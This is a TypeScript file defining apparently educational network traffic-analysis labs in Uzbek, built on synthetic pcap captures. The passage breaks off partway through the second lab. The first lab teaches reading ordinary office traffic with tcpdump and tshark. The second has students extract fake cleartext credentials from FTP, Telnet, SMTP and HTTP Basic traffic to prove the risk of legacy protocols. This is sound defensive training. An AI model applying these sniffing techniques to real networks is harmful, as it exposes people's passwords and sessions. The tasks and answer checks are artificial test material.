import type { Lab } from '../types';
import { decodeCapture, dissect, type Frame } from '../../engine/terminal/pcap';
import { at, Capture, httpGet, httpPost, httpResponse } from '../../engine/terminal/pcapBuild';
import { fileAt } from './helpers';

/*
 * Traffic analysis labs: capture files built from whole conversations (see pcapBuild.ts), read with tcpdump,
 * tshark and capinfos. Answers the checks compare against are computed from the same captures.
 */

const HOME = '/home/talaba';
const frames = (content: string): Frame[] => dissect(decodeCapture(content)!);
const field = (f: Frame, name: string) => f.fields.get(name) ?? [];

/* ── 1. An ordinary morning on an office PC ────────────────────────────── */

const PC = '10.10.20.31';
const GW = '10.10.20.1';
const INTRANET = '10.10.20.10';
const BIG_TALKER = '13.107.4.50';

function officeCapture(): string {
  const c = new Capture();
  const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36';
  c.arp(at(9, 0, 0.21), GW, PC, '00:50:56:c0:00:01');
  c.dns(at(9, 0, 0.5), PC, GW, 'intranet.lab', [INTRANET]);
  let t = c.tcp(at(9, 0, 0.6), PC, 52101, INTRANET, 80, [
    { c: httpGet('intranet.lab', '/', ua), s: httpResponse(200, 'OK', '<html><h1>Ichki portal</h1><a href="/hodimlar">Hodimlar</a></html>') },
  ]);
  t = c.tcp(t + 1.4, PC, 52102, INTRANET, 80, [
    { c: httpGet('intranet.lab', '/hodimlar', ua, ['Referer: http://intranet.lab/']), s: httpResponse(200, 'OK', "<html><h1>Hodimlar ro'yxati</h1><ul><li>d.karimova — moliya</li><li>a.tursunov — IT</li></ul></html>") },
  ]);
  c.tcp(t + 0.2, PC, 52103, INTRANET, 80, [{ c: httpGet('intranet.lab', '/favicon.ico', ua), s: httpResponse(404, 'Not Found', '<h1>404</h1>') }]);
  c.dns(at(9, 0, 8), PC, GW, 'www.google.com', ['142.250.74.110']);
  c.tls(at(9, 0, 8.1), PC, 52110, '142.250.74.110', 'www.google.com', [702, 9130, 518, 3302]);
  c.dns(at(9, 0, 15), PC, GW, 'mail.example.com', ['203.0.113.81']);
  c.tls(at(9, 0, 15.1), PC, 52120, '203.0.113.81', 'mail.example.com', [940, 12440]);
  c.dns(at(9, 0, 31), PC, GW, 'printer.lab', 'NXDOMAIN');
  c.ping(at(9, 0, 40), PC, GW, 4);
  c.dns(at(9, 1, 2), PC, GW, 'update.microsoft.com', [BIG_TALKER]);
  c.tls(at(9, 1, 2.1), PC, 52130, BIG_TALKER, 'update.microsoft.com', [1220, 48600, 640, 31200]);
  c.dns(at(9, 1, 20), PC, GW, 'cdn.jsdelivr.net', ['151.101.1.229']);
  c.tls(at(9, 1, 20.1), PC, 52140, '151.101.1.229', 'cdn.jsdelivr.net', [480, 7320]);
  return c.build();
}

const OFFICE = officeCapture();
const OFFICE_FRAMES = frames(OFFICE);
const OFFICE_QUERIES = [...new Set(OFFICE_FRAMES.filter((f) => field(f, 'dns.flags.response')[0] === 0).map((f) => String(field(f, 'dns.qry.name')[0])))].sort();
const OFFICE_ICMP = OFFICE_FRAMES.filter((f) => f.p.p === 'ICMP').length;
const OFFICE_DNS = OFFICE_FRAMES.filter((f) => f.p.dns).length;
const HODIMLAR_STREAM = OFFICE_FRAMES.find((f) => field(f, 'http.request.uri')[0] === '/hodimlar')!.stream!;

export const trafficBasics: Lab = {
  id: 'trafik-asoslari',
  title: 'Trafik tahlili asoslari: ofisdagi bir tong',
  summary: "Yozib olingan trafikni tcpdump va tshark bilan o'qish: paket qatori, BPF va display filtrlari, DNS, HTTP, HTTPS (SNI), ARP va ICMP, statistika va oqimni tiklash.",
  minutes: 50,
  level: 1,
  intro:
    "Moliya bo'limidagi `10.10.20.31` kompyuteridan ertalabki ikki daqiqalik trafik yozib olindi: `ofis.pcap`. Bu oddiy, toza trafik — keyingi lablarda shubhali trafikni ajratish uchun avval **odatiy holat** qanday ko'rinishini bilib olasiz.\n\n" +
    "Ikki asosiy vosita:\n- `tcpdump` — har paket bitta qatorda, filtri **BPF** tilida: `host 10.10.20.10`, `port 53`, `tcp and not port 443`.\n- `tshark` — Wireshark'ning terminal ko'rinishi: har paketning protokoli va ma'nosi, filtri **display filter** tilida: `dns`, `ip.addr == 10.10.20.10`, `http.request`.\n\n" +
    "Ikkala tilni aralashtirmang: `host X` — tcpdump, `ip.addr == X` — tshark.",
  shell: () => ({ fs: { home: { talaba: { 'ofis.pcap': OFFICE } }, tmp: {} } }),
  tasks: [
    {
      id: 'file',
      teach: ['file'],
      text: '`ofis.pcap` qanday fayl? `cat` emas, `file` bilan tekshiring.',
      hint: '`file ofis.pcap` — pcap: tarmoq paketlari yozuvi. `cat` qilsangiz, ikkilik shovqin ko\'rinadi.',
      solution: ['file ofis.pcap'],
      check: ({ output }) => output.includes('pcap capture file'),
    },
    {
      id: 'capinfos',
      teach: ['capinfos'],
      text: 'Yozuvda nechta paket bor va u qancha vaqtni qamraydi?',
      hint: '`capinfos ofis.pcap` — Number of packets va Capture duration.',
      solution: ['capinfos ofis.pcap'],
      check: ({ output }) => output.includes(`Number of packets:   ${OFFICE_FRAMES.length}`),
    },
    {
      id: 'first',
      teach: ['tcpdump', 'tcpdump -r', 'tcpdump -c'],
      text: 'Birinchi 5 ta paketni tcpdump bilan ko\'ring.',
      hint: '`tcpdump -r ofis.pcap -c 5` — birinchi qator "reading from file..." — xabar, paket emas.',
      solution: ['tcpdump -r ofis.pcap -c 5'],
      check: ({ line, output }) => /tcpdump/.test(line) && /-c\s*5/.test(line) && output.split('\n').length === 6,
    },
    {
      id: 'numeric',
      teach: ['tcpdump -n', 'tcpdump -nn'],
      text: 'Endi nomlarsiz, faqat raqamlar bilan: IP manzil va port raqamlari ko\'rinsin.',
      hint: '`tcpdump -nn -r ofis.pcap -c 5` — `domain` o\'rniga 53, `http` o\'rniga 80.',
      solution: ['tcpdump -nn -r ofis.pcap -c 5'],
      check: ({ line, output }) => /-nn/.test(line) && /\.53: /.test(output),
    },
    {
      id: 'arp',
      teach: ['tcpdump tcp / udp / icmp / arp'],
      text: 'Kompyuter tarmoqqa chiqishdan oldin shlyuzning MAC manzilini so\'radi. ARP paketlarini toping.',
      hint: '`tcpdump -nn -r ofis.pcap arp` — "who-has 10.10.20.1 tell 10.10.20.31" va javob "is-at".',
      solution: ['tcpdump -nn -r ofis.pcap arp'],
      check: ({ output }) => output.includes('who-has 10.10.20.1 tell 10.10.20.31') && output.includes('is-at'),
    },
    {
      id: 'mac',
      teach: ['tcpdump -e'],
      text: 'Shu ARP paketlarida MAC manzillar ham ko\'rinsin.',
      hint: '`tcpdump -e -nn -r ofis.pcap arp` — ff:ff:ff:ff:ff:ff — hammaga (broadcast).',
      solution: ['tcpdump -e -nn -r ofis.pcap arp'],
      check: ({ output }) => output.includes('ff:ff:ff:ff:ff:ff') && output.includes('ethertype ARP'),
    },
    {
      id: 'icmp',
      text: 'Nechta ICMP (ping) paketi bor? Faqat sonni oling.',
      hint: '`tcpdump -nn -r ofis.pcap icmp | wc -l` — "reading from file" qatori ekranga chiqadi, lekin quvurga tushmaydi.',
      solution: ['tcpdump -nn -r ofis.pcap icmp | wc -l'],
      check: ({ output }) => output.trim().split('\n').pop()!.trim() === String(OFFICE_ICMP),
    },
    {
      id: 'dns',
      teach: ['tcpdump port N'],
      text: 'DNS so\'rovlari va javoblarini ko\'ring (port 53).',
      hint: '`tcpdump -nn -r ofis.pcap port 53` — `A? nom.` — so\'rov, `1/0/0 A IP` — javob.',
      solution: ['tcpdump -nn -r ofis.pcap port 53'],
      check: ({ output }) => output.includes('A? www.google.com.') && output.includes('NXDomain'),
    },
    {
      id: 'host',
      teach: ['tcpdump host IP'],
      text: 'Ichki portal (`10.10.20.10`) bilan almashilgan paketlarni ajrating.',
      hint: '`tcpdump -nn -r ofis.pcap host 10.10.20.10`',
      solution: [`tcpdump -nn -r ofis.pcap host ${INTRANET}`],
      check: ({ output }) => output.includes(`${INTRANET}.80`) && !output.includes('.443'),
    },
    {
      id: 'ascii',
      teach: ['tcpdump -A'],
      text: "HTTP shifrlanmagan — mazmunini ham ko'rish mumkin. 80-port paketlarini matni bilan chiqaring.",
      hint: '`tcpdump -nn -A -r ofis.pcap port 80` — so\'rov sarlavhalari va sahifa HTML\'i ochiq ko\'rinadi.',
      solution: ['tcpdump -nn -A -r ofis.pcap port 80'],
      check: ({ output }) => output.includes('Host: intranet.lab') && output.includes('Ichki portal'),
    },
    {
      id: 'not',
      teach: ['tcpdump and / or / not'],
      text: "HTTPS (443) dan boshqa barcha TCP trafikni ko'rsating.",
      hint: "`tcpdump -nn -r ofis.pcap 'tcp and not port 443'` — bir nechta so'zli filtrni qo'shtirnoqqa oling.",
      solution: ["tcpdump -nn -r ofis.pcap 'tcp and not port 443'"],
      check: ({ output }) => output.includes('.80') && !output.includes('.443') && !output.includes('.53:'),
    },
    {
      id: 'tshark',
      teach: ['tshark', 'tshark -r', 'tshark -c'],
      text: 'Endi tshark: birinchi 10 ta paket — protokoli va ma\'nosi bilan.',
      hint: '`tshark -r ofis.pcap -c 10` — ustunlar: raqam, vaqt (boshidan soniya), manba → manzil, protokol, uzunlik, ma\'lumot.',
      solution: ['tshark -r ofis.pcap -c 10'],
      check: ({ line, output }) => /^tshark/.test(line) && output.split('\n').length === 10 && output.includes('DNS'),
    },
    {
      id: 'Y-dns',
      teach: ['tshark -Y'],
      text: 'Display filtri bilan faqat DNS paketlarini chiqaring.',
      hint: "`tshark -r ofis.pcap -Y dns`",
      solution: ['tshark -r ofis.pcap -Y dns'],
      check: ({ output }) => output.split('\n').length === OFFICE_DNS && output.includes('Standard query response'),
    },
    {
      id: 'domains',
      teach: ['tshark -T', 'tshark -e', 'tshark dns.qry.name'],
      text: "Kompyuter qaysi domenlarni so'radi? Faqat so'rovlardagi nomlarni, takrorsiz chiqaring.",
      hint: "`tshark -r ofis.pcap -Y 'dns.flags.response == 0' -T fields -e dns.qry.name | sort -u`",
      solution: ["tshark -r ofis.pcap -Y 'dns.flags.response == 0' -T fields -e dns.qry.name | sort -u"],
      check: ({ output }) => output.trim() === OFFICE_QUERIES.join('\n'),
    },
    {
      id: 'nxdomain',
      text: "Qaysi domen topilmadi (javob kodi 3 — NXDOMAIN)?",
      hint: "`tshark -r ofis.pcap -Y 'dns.flags.rcode == 3'` — printer.lab: sozlamada eski printer nomi qolgan.",
      solution: ["tshark -r ofis.pcap -Y 'dns.flags.rcode == 3'"],
      check: ({ output }) => output.includes('No such name A printer.lab'),
    },
    {
      id: 'answers',
      text: 'Har bir domen qaysi IP manzilga aylandi? Javoblardan nom va IP ni chiqaring.',
      hint: "`tshark -r ofis.pcap -Y 'dns.flags.response == 1' -T fields -e dns.qry.name -e dns.a`",
      solution: ["tshark -r ofis.pcap -Y 'dns.flags.response == 1' -T fields -e dns.qry.name -e dns.a"],
      check: ({ output }) => output.includes(`intranet.lab\t${INTRANET}`) && output.includes(`update.microsoft.com\t${BIG_TALKER}`),
    },
    {
      id: 'http',
      teach: ['tshark http.request'],
      text: "Qaysi HTTP sahifalar so'raldi? Sayt nomi va yo'lini chiqaring.",
      hint: "`tshark -r ofis.pcap -Y http.request -T fields -e http.host -e http.request.uri`",
      solution: ['tshark -r ofis.pcap -Y http.request -T fields -e http.host -e http.request.uri'],
      check: ({ output }) => output.includes('intranet.lab\t/hodimlar') && output.includes('/favicon.ico'),
    },
    {
      id: '404',
      teach: ['tshark http.response.code'],
      text: 'Qaysi so\'rov "topilmadi" (404) javobini oldi?',
      hint: "`tshark -r ofis.pcap -Y 'http.response.code == 404'`",
      solution: ["tshark -r ofis.pcap -Y 'http.response.code == 404'"],
      check: ({ output }) => output.includes('HTTP/1.1 404 Not Found'),
    },
    {
      id: 'sni',
      teach: ['tshark tls.handshake.extensions_server_name'],
      text: "HTTPS shifrlangan, lekin ulanish boshida sayt nomi (SNI) ochiq ketadi. Qaysi HTTPS saytlarga kirildi?",
      hint: "`tshark -r ofis.pcap -Y 'tls.handshake.type == 1' -T fields -e tls.handshake.extensions_server_name`",
      solution: ["tshark -r ofis.pcap -Y 'tls.handshake.type == 1' -T fields -e tls.handshake.extensions_server_name"],
      check: ({ output }) => output.includes('mail.example.com') && output.includes('update.microsoft.com') && !output.includes('intranet.lab'),
    },
    {
      id: 'conv',
      teach: ['tshark -q', 'tshark -z'],
      text: "Kompyuter kim bilan qancha ma'lumot almashdi? IP suhbatlari statistikasini chiqaring.",
      hint: '`tshark -r ofis.pcap -q -z conv,ip` — -q: paketlar ro\'yxatisiz, -z: statistika. Eng ko\'p bayt — tepada.',
      solution: ['tshark -r ofis.pcap -q -z conv,ip'],
      check: ({ output }) => output.includes('IPv4 Conversations') && output.includes(BIG_TALKER),
    },
    {
      id: 'phs',
      text: 'Trafikning qancha qismi qaysi protokolda? Protokollar ierarxiyasini ko\'ring.',
      hint: '`tshark -r ofis.pcap -q -z io,phs` — tls ko\'p, http kam: bu yaxshi belgi.',
      solution: ['tshark -r ofis.pcap -q -z io,phs'],
      check: ({ output }) => output.includes('Protocol Hierarchy Statistics') && /tls\s+frames:/.test(output),
    },
    {
      id: 'follow',
      text: "`/hodimlar` sahifasi so'ralgan TCP oqimini (stream) toping va suhbatni to'liq tiklang.",
      hint: `Avval oqim raqami: \`tshark -r ofis.pcap -Y http.request -T fields -e tcp.stream -e http.request.uri\`, keyin \`tshark -r ofis.pcap -q -z follow,tcp,ascii,${HODIMLAR_STREAM}\``,
      solution: ['tshark -r ofis.pcap -Y http.request -T fields -e tcp.stream -e http.request.uri', `tshark -r ofis.pcap -q -z follow,tcp,ascii,${HODIMLAR_STREAM}`],
      check: ({ output }) => output.includes('Follow: tcp,ascii') && output.includes("Hodimlar ro'yxati"),
    },
    {
      id: 'write',
      teach: ['tcpdump -w'],
      text: 'Faqat DNS trafikni alohida faylga — `~/dns.pcap` ga ajratib saqlang.',
      hint: '`tcpdump -r ofis.pcap -w ~/dns.pcap port 53`, tekshirish: `capinfos ~/dns.pcap`',
      solution: ['tcpdump -r ofis.pcap -w ~/dns.pcap port 53'],
      check: ({ state }) => {
        const content = fileAt(state, `${HOME}/dns.pcap`);
        const packets = content ? decodeCapture(content) : null;
        return !!packets && packets.length === OFFICE_DNS && packets.every((p) => p.dns);
      },
    },
    {
      id: 'challenge',
      challenge: true,
      text: "Mustaqil vazifa: kompyuter eng ko'p bayt almashgan tashqi IP manzil qaysi? Natijada faqat shu IP bo'lsin.",
      hint: "IP suhbatlari bayt bo'yicha kamayish tartibida. Birinchi qatorni ajrating (head/tail), keyin kerakli ustunni (awk).",
      solution: ["tshark -r ofis.pcap -q -z conv,ip | head -n 6 | tail -n 1 | awk '{print $3}'"],
      check: ({ output }) => output.trim() === BIG_TALKER,
    },
  ],
};


/* ── 2. Cleartext protocols on the office network ──────────────────────── */

const ADMIN_PC = '10.10.20.44';
const FTP_SRV = '10.10.20.12';
const PRINTER = '10.10.20.60';
const SWITCH = '10.10.20.2';
const MAIL_SRV = '10.10.20.25';
const SOFT_SRV = '198.51.100.15';
const PRINTER_BASIC = 'YWRtaW46cHJpbnRlcjEyMw==';

function legacyCapture(): string {
  const c = new Capture();
  const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36';
  c.dns(at(10, 0, 0.2), ADMIN_PC, GW, 'github.com', ['140.82.121.4']);
  c.tls(at(10, 0, 0.3), ADMIN_PC, 53001, '140.82.121.4', 'github.com', [880, 15400]);
  // Backup server over plain FTP.
  c.tcp(at(10, 0, 5), ADMIN_PC, 53010, FTP_SRV, 21, [
    { s: '220 (vsFTPd 3.0.5)\r\n' },
    { c: 'USER backup\r\n', s: '331 Please specify the password.\r\n' },
    { c: 'PASS Zaxira2024!\r\n', s: '230 Login successful.\r\n' },
    { c: 'TYPE I\r\n', s: '200 Switching to Binary mode.\r\n' },
    { c: 'PASV\r\n', s: '227 Entering Passive Mode (10,10,20,12,195,81).\r\n' },
    { c: 'RETR db-backup-2026-11-16.sql.gz\r\n', s: '150 Opening BINARY mode data connection for db-backup-2026-11-16.sql.gz (48213 bytes).\r\n' },
    { s: '226 Transfer complete.\r\n', dt: 0.6 },
    { c: 'QUIT\r\n', s: '221 Goodbye.\r\n' },
  ]);
  // Printer admin page with HTTP Basic authentication.
  c.tcp(at(10, 0, 12), ADMIN_PC, 53020, PRINTER, 80, [
    { c: httpGet('10.10.20.60', '/admin/', ua, [`Authorization: Basic ${PRINTER_BASIC}`]), s: httpResponse(200, 'OK', '<html><h1>HP LaserJet — Administrator</h1></html>', 'text/html', ['Server: HP HTTP Server; HP LaserJet M507']) },
  ]);
  // Intranet login form over HTTP.
  c.dns(at(10, 0, 20), ADMIN_PC, GW, 'intranet.lab', [INTRANET]);
  c.tcp(at(10, 0, 20.1), ADMIN_PC, 53030, INTRANET, 80, [
    { c: httpPost('intranet.lab', '/login', 'username=a.tursunov&password=Kuz2026%21', ua), s: httpResponse(302, 'Found', '', 'text/html', ['Location: /panel', 'Set-Cookie: session=8f2c41d0aa7e; Path=/']) },
    { c: httpGet('intranet.lab', '/panel', ua, ['Cookie: session=8f2c41d0aa7e']), s: httpResponse(200, 'OK', '<html><h1>Boshqaruv paneli</h1></html>') },
  ]);
  // Telnet to the core switch.
  c.tcp(at(10, 0, 31), ADMIN_PC, 53040, SWITCH, 23, [
    { s: '\r\nUser Access Verification\r\n\r\nUsername: ' },
    { c: 'admin\r\n', s: 'Password: ', dt: 1.2 },
    { c: 'Cisco#77\r\n', s: '\r\nsw-core-01>', dt: 1.5 },
    { c: 'enable\r\n', s: 'Password: ', dt: 2 },
    { c: 'Cisco#77\r\n', s: '\r\nsw-core-01#', dt: 1.1 },
    { c: 'show vlan brief\r\n', s: '\r\nVLAN Name      Status    Ports\r\n10   moliya    active    Gi1/0/1-12\r\n20   it        active    Gi1/0/13-24\r\nsw-core-01#', dt: 2.4 },
    { c: 'exit\r\n', dt: 3 },
  ]);
  // Mail without TLS.
  c.tcp(at(10, 0, 50), ADMIN_PC, 53050, MAIL_SRV, 25, [
    { s: '220 mail.qaydnoma.lab ESMTP Postfix\r\n' },
    { c: 'EHLO it-044\r\n', s: '250-mail.qaydnoma.lab\r\n250 8BITMIME\r\n' },
    { c: 'MAIL FROM:<a.tursunov@qaydnoma.lab>\r\n', s: '250 2.1.0 Ok\r\n' },
    { c: 'RCPT TO:<d.karimova@qaydnoma.lab>\r\n', s: '250 2.1.5 Ok\r\n' },
    { c: 'DATA\r\n', s: '354 End data with <CR><LF>.<CR><LF>\r\n' },
    { c: 'From: a.tursunov@qaydnoma.lab\r\nTo: d.karimova@qaydnoma.lab\r\nSubject: VPN paroli\r\n\r\nSalom! Yangi VPN parol: Qish2027\r\nUni hech kimga bermang.\r\n.\r\n', s: '250 2.0.0 Ok: queued as 4F1A2B\r\n' },
    { c: 'QUIT\r\n', s: '221 2.0.0 Bye\r\n' },
  ]);
  // A tool downloaded over HTTP, and two scripts talking to an API.
  c.dns(at(10, 1, 10), ADMIN_PC, GW, 'files.soft-portal.example', [SOFT_SRV]);
  c.tcp(at(10, 1, 10.1), ADMIN_PC, 53060, SOFT_SRV, 80, [
    { c: httpGet('files.soft-portal.example', '/downloads/netscan-tool.exe', ua), s: httpResponse(200, 'OK', 'MZ This program cannot be run in DOS mode.', 'application/x-msdownload') },
  ]);
  c.tcp(at(10, 1, 30), ADMIN_PC, 53070, INTRANET, 80, [{ c: httpGet('intranet.lab', '/api/status', 'curl/8.5.0'), s: httpResponse(200, 'OK', '{"status":"ok"}', 'application/json') }]);
  c.tcp(at(10, 1, 40), ADMIN_PC, 53080, INTRANET, 80, [{ c: httpGet('intranet.lab', '/api/users', 'python-requests/2.32.3'), s: httpResponse(401, 'Unauthorized', '{"error":"token required"}', 'application/json') }]);
  return c.build();
}

const LEGACY = legacyCapture();
const LEGACY_FRAMES = frames(LEGACY);
const streamOf = (fs: Frame[], port: number) => fs.find((f) => f.p.dp === port && f.p.p === 'TCP')!.stream!;
const TELNET_STREAM = streamOf(LEGACY_FRAMES, 23);
const SMTP_STREAM = streamOf(LEGACY_FRAMES, 25);
const CLEARTEXT_COUNT = LEGACY_FRAMES.filter((f) => ['FTP', 'TELNET', 'SMTP', 'HTTP'].includes(f.proto)).length;

export const trafficCleartext: Lab = {
  id: 'trafik-ochiq-matn',
  title: "Ochiq matndagi parollar: eski protokollar auditi",
  summary: "FTP, Telnet, SMTP va HTTP orqali ochiq ketayotgan login va parollarni topish: display filtrlari, HTTP Basic'ni ochish, oqimlarni tiklash, yuklab olingan faylni aniqlash.",
  minutes: 50,
  level: 2,
  intro:
    "IT bo'limi kompyuteridan (`10.10.20.44`) bir necha daqiqalik trafik yozib olindi: `eski.pcap`. Kompaniyada hali eski tizimlar bor — zaxira FTP serveri, printerning veb-paneli, Telnet bilan boshqariladigan switch, TLS'siz pochta. Sizning vazifangiz — rahbariyatga **xavfni isbotlash**: tarmoqni eshitgan har kim nimani ko'ra olishini aniqlash.\n\n" +
    "Bu labda asosan `tshark` ishlatiladi. Protokol maydonlari: `ftp.request.command`, `http.authorization`, `http.file_data`, `smtp.req.command`, `tcp.stream`. Oqimni to'liq tiklash: `-q -z follow,tcp,ascii,N`.",
  shell: () => ({ fs: { home: { talaba: { 'eski.pcap': LEGACY } }, tmp: {} } }),
  tasks: [
    {
      id: 'phs',
      text: "Avval umumiy rasm: trafikda qaysi protokollar bor? Shifrlanmaganlarini ajrating.",
      hint: '`tshark -r eski.pcap -q -z io,phs` — ftp, telnet, smtp, http: hammasi ochiq matn. tls — shifrlangan.',
      solution: ['tshark -r eski.pcap -q -z io,phs'],
      check: ({ output }) => ['ftp', 'telnet', 'smtp', 'http', 'tls'].every((p) => new RegExp(`\\b${p}\\s+frames:`).test(output)),
    },
    {
      id: 'conv-tcp',
      text: "Qaysi serverlar va portlar bilan TCP ulanishlar bo'lgan?",
      hint: '`tshark -r eski.pcap -q -z conv,tcp` — :21 FTP, :23 Telnet, :25 SMTP, :80 HTTP, :443 HTTPS.',
      solution: ['tshark -r eski.pcap -q -z conv,tcp'],
      check: ({ output }) => output.includes('TCP Conversations') && output.includes(`${SWITCH}:23`),
    },
    {
      id: 'ftp',
      teach: ['tshark tcp.port == N'],
      text: 'FTP (21-port) suhbatini ko\'ring: server va mijoz nima deyishdi?',
      hint: "`tshark -r eski.pcap -Y 'tcp.port == 21 && ftp'` — Request: — mijoz, Response: — server.",
      solution: ["tshark -r eski.pcap -Y 'tcp.port == 21 && ftp'"],
      check: ({ output }) => output.includes('Request: USER backup') && output.includes('Response: 230 Login successful.'),
    },
    {
      id: 'ftp-pass',
      teach: ['tshark ftp.request.command'],
      text: 'FTP paroli tarmoqda ochiq ketdi. Faqat parolni (va kim yuborganini) chiqaring.',
      hint: "`tshark -r eski.pcap -Y 'ftp.request.command == \"PASS\"' -T fields -e ip.src -e ftp.request.arg`",
      solution: ["tshark -r eski.pcap -Y 'ftp.request.command == \"PASS\"' -T fields -e ip.src -e ftp.request.arg"],
      check: ({ output }) => output.trim() === `${ADMIN_PC}\tZaxira2024!`,
    },
    {
      id: 'ftp-file',
      text: 'Login bilan qaysi fayl yuklab olindi (RETR)?',
      hint: "`tshark -r eski.pcap -Y 'ftp.request.command == \"RETR\"' -T fields -e ftp.request.arg` — ma'lumotlar bazasi zaxirasi: u ham shifrlanmagan kanal orqali ketdi.",
      solution: ["tshark -r eski.pcap -Y 'ftp.request.command == \"RETR\"' -T fields -e ftp.request.arg"],
      check: ({ output }) => output.trim() === 'db-backup-2026-11-16.sql.gz',
    },
    {
      id: 'hex',
      teach: ['tcpdump -X'],
      text: "tcpdump ham parolni ko'radi: FTP paketlarini hex va ASCII ko'rinishida chiqaring.",
      hint: '`tcpdump -nn -X -r eski.pcap port 21` — o\'ng ustunda `PASS Zaxira2024!`.',
      solution: ['tcpdump -nn -X -r eski.pcap port 21'],
      check: ({ output }) => output.includes('0x0000:') && output.includes('PASS Zaxira2024!'),
    },
    {
      id: 'basic',
      text: "Printer paneliga kirishda `Authorization` sarlavhasi ishlatilgan. Uning qiymatini chiqaring.",
      hint: "`tshark -r eski.pcap -Y 'http.authorization' -T fields -e ip.dst -e http.authorization` — Basic — shifrlash emas, Base64.",
      solution: ["tshark -r eski.pcap -Y 'http.authorization' -T fields -e ip.dst -e http.authorization"],
      check: ({ output }) => output.includes(`Basic ${PRINTER_BASIC}`),
    },
    {
      id: 'basic-decode',
      text: 'Basic qiymatini oching: login:parol ko\'rinishida chiqadi.',
      hint: `\`echo ${PRINTER_BASIC} | base64 -d\``,
      solution: [`echo ${PRINTER_BASIC} | base64 -d`],
      check: ({ output }) => output.trim() === 'admin:printer123',
    },
    {
      id: 'post',
      text: 'Ichki portalga login formasi yuborilgan (POST). Qaysi manzilga?',
      hint: "`tshark -r eski.pcap -Y 'http.request.method == \"POST\"'`",
      solution: ["tshark -r eski.pcap -Y 'http.request.method == \"POST\"'"],
      check: ({ output }) => output.includes('POST /login HTTP/1.1'),
    },
    {
      id: 'post-body',
      teach: ['tshark contains'],
      text: "Formaning mazmunini ko'ring: \"password\" so'zi bor HTTP paketlardan yuborilgan ma'lumotni chiqaring.",
      hint: "`tshark -r eski.pcap -Y 'http contains \"password\"' -T fields -e http.host -e http.file_data` — %21 — URL'da kodlangan `!`.",
      solution: ["tshark -r eski.pcap -Y 'http contains \"password\"' -T fields -e http.host -e http.file_data"],
      check: ({ output }) => output.includes('username=a.tursunov&password=Kuz2026%21'),
    },
    {
      id: 'cookie',
      text: "Login muvaffaqiyatli bo'ldimi? Javobdagi yo'naltirish va sessiya cookie'sini toping — bu ham o'g'irlanishi mumkin.",
      hint: "`tshark -r eski.pcap -Y 'http.response.code == 302' -T fields -e http.location -e http.set_cookie`",
      solution: ["tshark -r eski.pcap -Y 'http.response.code == 302' -T fields -e http.location -e http.set_cookie"],
      check: ({ output }) => output.includes('/panel') && output.includes('session=8f2c41d0aa7e'),
    },
    {
      id: 'telnet-stream',
      teach: ['tshark tcp.stream'],
      text: 'Telnet (23-port) ulanishi qaysi TCP oqimida?',
      hint: "`tshark -r eski.pcap -Y telnet -T fields -e tcp.stream | sort -u`",
      solution: ['tshark -r eski.pcap -Y telnet -T fields -e tcp.stream | sort -u'],
      check: ({ output }) => output.trim() === String(TELNET_STREAM),
    },
    {
      id: 'telnet-follow',
      text: "Telnet sessiyasini to'liq tiklang: switch'ga qanday login va parol bilan kirilgan?",
      hint: `\`tshark -r eski.pcap -q -z follow,tcp,ascii,${TELNET_STREAM}\` — parol ikki marta: kirishda va enable rejimida.`,
      solution: [`tshark -r eski.pcap -q -z follow,tcp,ascii,${TELNET_STREAM}`],
      check: ({ output }) => output.includes('Username:') && output.includes('Cisco#77') && output.includes('sw-core-01#'),
    },
    {
      id: 'smtp',
      text: 'Pochta (SMTP) orqali kim kimga xat yubordi?',
      hint: "`tshark -r eski.pcap -Y smtp.req.command -T fields -e smtp.req.command -e smtp.req.parameter`",
      solution: ['tshark -r eski.pcap -Y smtp.req.command -T fields -e smtp.req.command -e smtp.req.parameter'],
      check: ({ output }) => output.includes('MAIL\tFROM:<a.tursunov@qaydnoma.lab>') && output.includes('RCPT\tTO:<d.karimova@qaydnoma.lab>'),
    },
    {
      id: 'smtp-follow',
      text: "Xatning o'zini o'qing: mavzusi va ichida nima bor?",
      hint: `\`tshark -r eski.pcap -q -z follow,tcp,ascii,${SMTP_STREAM}\` — TLS'siz pochta — ochiq otkritka.`,
      solution: [`tshark -r eski.pcap -q -z follow,tcp,ascii,${SMTP_STREAM}`],
      check: ({ output }) => output.includes('Subject: VPN paroli') && output.includes('Qish2027'),
    },
    {
      id: 'download',
      text: "HTTP orqali qanday fayl yuklab olingan? Barcha so'rovlarning sayt va yo'lini ko'ring.",
      hint: '`tshark -r eski.pcap -Y http.request -T fields -e http.host -e http.request.uri` — .exe shifrlanmagan kanal orqali: yo\'lda almashtirib qo\'yilishi mumkin.',
      solution: ['tshark -r eski.pcap -Y http.request -T fields -e http.host -e http.request.uri'],
      check: ({ output }) => output.includes('files.soft-portal.example\t/downloads/netscan-tool.exe'),
    },
    {
      id: 'mz',
      text: "Javobdagi faylning birinchi ikki belgisi qanday? (Windows dasturlari \"MZ\" bilan boshlanadi.)",
      hint: "`tshark -r eski.pcap -Y 'http.content_type == \"application/x-msdownload\"' -T fields -e http.file_data | head -c 2`",
      solution: ["tshark -r eski.pcap -Y 'http.content_type == \"application/x-msdownload\"' -T fields -e http.file_data | head -c 2"],
      check: ({ output }) => output.trim() === 'MZ',
    },
    {
      id: 'ua',
      text: "Qaysi dasturlar HTTP so'rov yuborgan? User-Agent'larni sanang.",
      hint: '`tshark -r eski.pcap -Y http.request -T fields -e http.user_agent | sort | uniq -c` — curl va python-requests: skriptlar.',
      solution: ['tshark -r eski.pcap -Y http.request -T fields -e http.user_agent | sort | uniq -c'],
      check: ({ output }) => output.includes('curl/8.5.0') && output.includes('python-requests/2.32.3'),
    },
    {
      id: 'count',
      teach: ['tshark and / or / not'],
      text: 'Hisobot uchun: ochiq matnli protokollardagi (FTP, Telnet, SMTP, HTTP) paketlar soni qancha?',
      hint: "`tshark -r eski.pcap -Y 'ftp || telnet || smtp || http' | wc -l`",
      solution: ["tshark -r eski.pcap -Y 'ftp || telnet || smtp || http' | wc -l"],
      check: ({ output }) => output.trim() === String(CLEARTEXT_COUNT),
    },
    {
      id: 'tls',
      text: "Taqqoslash uchun: HTTPS ulanishda nimani ko'ra olasiz? Faqat sayt nomini.",
      hint: "`tshark -r eski.pcap -Y 'tls.handshake.type == 1' -T fields -e tls.handshake.extensions_server_name` — github.com, xolos. Login, parol, mazmun — shifrlangan.",
